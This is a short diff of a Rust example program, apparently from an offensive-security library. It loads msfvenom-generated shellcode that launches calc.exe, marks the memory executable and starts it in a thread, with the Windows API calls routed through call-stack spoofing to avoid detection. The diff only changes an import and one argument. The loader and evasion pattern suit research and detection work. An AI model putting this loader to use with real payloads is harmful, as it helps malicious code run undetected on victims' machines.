@@ -1,6 +1,6 @@
 use dinvk::{GetModuleHandle, GetProcAddress};
 use std::ptr::{copy_nonoverlapping, null_mut};
-use uwd::spoof;
+use uwd::{spoof, AsUwd};
 
 // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
 const SHELLCODE: [u8; 276] = [
@@ -40,7 +40,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Changes protection to PAGE_EXECUTE_READ
     let mut old_protection = 0usize;
-    spoof!(virtual_protect, addr, SHELLCODE.len(), 0x20, &mut old_protection as *mut _)?;
+    spoof!(virtual_protect, addr, SHELLCODE.len(), 0x20, old_protection.cast_mut())?;
 
     // Execute shellcode in new thread
     spoof!(create_thread, null_mut::<u8>(), 0, addr, null_mut::<u8>(), 0, 0)?;
